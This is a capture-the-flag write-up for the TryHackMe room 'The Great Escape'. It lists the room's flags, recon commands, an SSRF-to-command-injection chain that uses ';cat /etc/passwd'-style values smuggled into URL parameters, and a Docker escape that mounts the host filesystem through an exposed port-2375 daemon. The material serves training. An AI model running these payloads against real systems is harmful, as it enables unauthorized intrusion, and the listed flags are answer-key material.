
# <div align="center">[The Great Escape](https://tryhackme.com/r/room/thegreatescape)</div>
<div align="center">Our devs have created an awesome new site. Can you break out of the sandbox?</div>
<br>
<div align="center">
<img src="https://github.com/user-attachments/assets/aff860f5-44b7-4b8e-bb43-0f47a4c04e23" height="200"></img>
</div>


## Task 2. A Simple Webapp
Start off with a simple webapp. Can you find the hidden flag?
### Find the flag hidden in the webapp

```
THM{b801135794bf1ed3a2aafaa44c2e5ad4}
```
* ```nmap -sSCV -p- <IP>```
* ```gobuster dir -f -u http://<IP> -w /usr/share/wordlists/dirb/big.txt```
* ```curl http://<IP>/.well-known/security.txt```
* ```curl -I http://<IP>//api/fl46```

## Task 3. Root! Root?
```
THM{0cb4b947043cb5c0486a454b75a10876}
```
```
curl http://<IP>/robots.txt
http://<IP>/exif-util

http://<IP>/api/exif?url=http://api-dev-backup:8080
http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=
http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=;cat /etc/passwd
http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=;ls ~
http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=;cat ~/dev-note.txt
http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=;ls -la /root
http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=;git -C /root log
http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=;git -C /root show a3d30a7d0510dc6565ff9316e3fb84434916dee8
```

## Task 4. The Great Escape
You thought you had root. But the root on a docker container isn't all that helpful. Find the secret flag

Find the real root flag
```
THM{c62517c0cad93ac93a92b1315a32d734}
```
```
cd /opt
sudo git clone https://github.com/grongor/knock.git
cd knock
./knock <IP> 42 1337 10420 6969 63000
nmap <IP> -p 2375
sudo nano /etc/docker/daemon.json
sudo systemctl stop docker
sudo systemctl start docker
docker -H <IP>:2375 images
docker -H <IP>:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh
cat /etc/passwd
exit
docker -H <IP>:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt bash
cd /root
ls
cat flag.txt
```
